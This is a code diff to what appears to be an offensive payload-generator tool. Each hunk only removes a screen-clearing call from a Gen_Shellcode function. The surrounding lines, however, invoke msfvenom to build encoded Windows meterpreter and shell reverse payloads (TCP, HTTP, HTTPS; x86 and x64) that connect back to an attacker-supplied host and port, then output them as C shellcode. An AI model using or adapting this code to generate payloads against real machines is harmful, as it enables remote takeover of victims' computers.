@@ -24,7 +24,6 @@ def Gen_Shellcode(STAGED, ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p','windows/x64/meterpreter/reverse_http', LHOST, LPORT, '-e', Win_x64_Encoder, '-i',ITERATION, '-f', C_Extension]
                     PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
-                    core.Clear()
                     print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                     return SHELLCODE
 
@@ -36,7 +35,6 @@ def Gen_Shellcode(STAGED, ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p','windows/x64/meterpreter/reverse_https', LHOST, LPORT, '-e', Win_x64_Encoder, '-i',ITERATION, '-f', C_Extension]
                     PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
-                    core.Clear()
                     print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                     return SHELLCODE
 
@@ -48,7 +46,6 @@ def Gen_Shellcode(STAGED, ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p','windows/x64/meterpreter/reverse_tcp', LHOST, LPORT, '-e', Win_x64_Encoder, '-i',ITERATION, '-f', C_Extension]
                     PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
-                    core.Clear()
                     print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                     return SHELLCODE
 
@@ -59,7 +56,6 @@ def Gen_Shellcode(STAGED, ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p','windows/x64/shell/reverse_tcp', LHOST, LPORT, '-e', Win_x64_Encoder, '-i',ITERATION, '-f', C_Extension]
                     PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
-                    core.Clear()
                     print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                     return SHELLCODE
 
@@ -73,7 +69,6 @@ def Gen_Shellcode(STAGED, ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p','windows/meterpreter/reverse_http', LHOST, LPORT, '-e', Win_x86_Encoder, '-i',ITERATION, '-f', C_Extension]
                     PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
-                    core.Clear()
                     print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                     return SHELLCODE
 
@@ -85,7 +80,6 @@ def Gen_Shellcode(STAGED, ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p','windows/meterpreter/reverse_https', LHOST, LPORT, '-e', Win_x86_Encoder, '-i',ITERATION, '-f', C_Extension]
                     PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
-                    core.Clear()
                     print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                     return SHELLCODE
 
@@ -97,7 +91,6 @@ def Gen_Shellcode(STAGED, ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p','windows/meterpreter/reverse_tcp', LHOST, LPORT, '-e', Win_x86_Encoder, '-i',ITERATION, '-f', C_Extension]
                     PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
-                    core.Clear()
                     print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                     return SHELLCODE
 
@@ -108,7 +101,6 @@ def Gen_Shellcode(STAGED, ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p', 'windows/shell/reverse_tcp',LHOST, LPORT, '-e', Win_x64_Encoder, '-i', ITERATION, '-f', C_Extension]
                     PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
-                    core.Clear()
                     print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                     return SHELLCODE
 
@@ -123,7 +115,6 @@ def Gen_Shellcode(STAGED, ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p', 'windows/x64/meterpreter_reverse_http', LHOST, LPORT, '-e', Win_x64_Encoder, '-i', ITERATION, '-f', C_Extension]
                     PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
-                    core.Clear()
                     print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                     return SHELLCODE
 
@@ -135,7 +126,6 @@ def Gen_Shellcode(STAGED, ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p','windows/x64/meterpreter_reverse_https', LHOST, LPORT, '-e', Win_x64_Encoder, '-i', ITERATION, '-f', C_Extension]
                     PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
-                    core.Clear()
                     print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                     return SHELLCODE
 
@@ -147,7 +137,6 @@ def Gen_Shellcode(STAGED, ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p', 'windows/x64/meterpreter_reverse_tcp', LHOST, LPORT, '-e', Win_x64_Encoder, '-i', ITERATION, '-f', C_Extension]
                     PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
-                    core.Clear()
                     print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                     return SHELLCODE
 
@@ -158,7 +147,6 @@ def Gen_Shellcode(STAGED, ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p', 'windows/x64/shell_reverse_tcp', LHOST, LPORT, '-e', Win_x64_Encoder, '-i', ITERATION, '-f', C_Extension]
                     PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
-                    core.Clear()
                     print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                     return SHELLCODE
 
@@ -172,7 +160,6 @@ def Gen_Shellcode(STAGED, ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p', 'windows/meterpreter_reverse_http', LHOST, LPORT, '-e', Win_x86_Encoder, '-i', ITERATION, '-f', C_Extension]
                     PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
-                    core.Clear()
                     print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                     return SHELLCODE
 
@@ -184,7 +171,6 @@ def Gen_Shellcode(STAGED, ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p', 'windows/meterpreter_reverse_https', LHOST, LPORT, '-e', Win_x86_Encoder, '-i', ITERATION, '-f', C_Extension]
                     PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
-                    core.Clear()
                     print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                     return SHELLCODE
 
@@ -196,7 +182,6 @@ def Gen_Shellcode(STAGED, ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p', 'windows/meterpreter_reverse_tcp', LHOST, LPORT, '-e', Win_x86_Encoder, '-i', ITERATION, '-f', C_Extension]
                     PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
-                    core.Clear()
                     print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                     return SHELLCODE
 
@@ -207,7 +192,6 @@ def Gen_Shellcode(STAGED, ARCH, PROTOCOLE, TYPE, LHOST, LPORT):
                     MSFVENOM = ['msfvenom', '-a', ARCH, '--platform', 'windows', '-p', 'windows/shell_reverse_tcp', LHOST, LPORT, '-e', Win_x64_Encoder, '-i', ITERATION, '-f', C_Extension]
                     PAYLOAD = subprocess.run(MSFVENOM, shell=False, stdout=subprocess.PIPE).stdout.decode('utf-8')
                     SHELLCODE = Unnecessary_Characters(PAYLOAD)
-                    core.Clear()
                     print(core.amcolors.GREEN + core.amcolors.BOLD + "[+] Shellcode generated." + core.amcolors.ENDC)
                     return SHELLCODE
 
